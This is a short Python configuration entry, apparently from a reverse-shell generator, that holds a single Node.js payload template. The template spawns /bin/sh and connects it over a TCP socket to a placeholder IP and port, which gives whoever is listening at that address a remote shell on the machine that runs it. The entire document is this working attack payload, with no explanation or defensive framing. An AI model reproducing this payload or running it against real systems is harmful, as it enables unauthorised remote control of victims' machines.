conf = {
    "name": "nodejs",
    "templates": [
        '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(%PORT%, "%IP%", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
    ]
}
